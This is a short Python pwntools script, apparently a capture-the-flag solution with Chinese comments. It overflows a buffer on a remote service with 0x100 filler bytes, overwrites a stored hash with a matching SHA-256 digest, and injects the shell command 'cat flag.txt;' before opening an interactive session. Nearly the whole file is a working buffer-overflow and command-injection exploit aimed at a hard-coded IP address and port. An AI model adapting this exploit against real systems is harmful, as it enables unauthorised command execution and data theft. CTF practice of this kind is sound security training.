import hashlib
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# 运行的命令
cmd = b'cat flag.txt;'.ljust(0x1b, b' ') # 补充空格，不能补0字节，否则失败；此外需要在命令后面加分号，不然会和后续的字符串混在一起
print(cmd)

#origin_hash
orig_hash = b''.join([
    p64(0x6530306137383339),
    p64(0x3563333134653133),
    p64(0x6338306339666135),
    p64(0x6139313164633936),
    p64(0x3366653538363462),
    p64(0x3165626362386362),
    p64(0x3131363132386663),
    p64(0x3732313735343931),
    p8(0)
])
print(orig_hash)

user_input = b'a' * 0x100
craft_hash = hashlib.sha256(user_input)
print(craft_hash.hexdigest())

# p = process('../file/d2bc59264cc24b5ab2e5357c058de6d7')
p = remote('61.147.171.105', '56911')

input('conitnue?')

payload = user_input + cmd + craft_hash.hexdigest().encode()
p.sendline(payload)

p.interactive()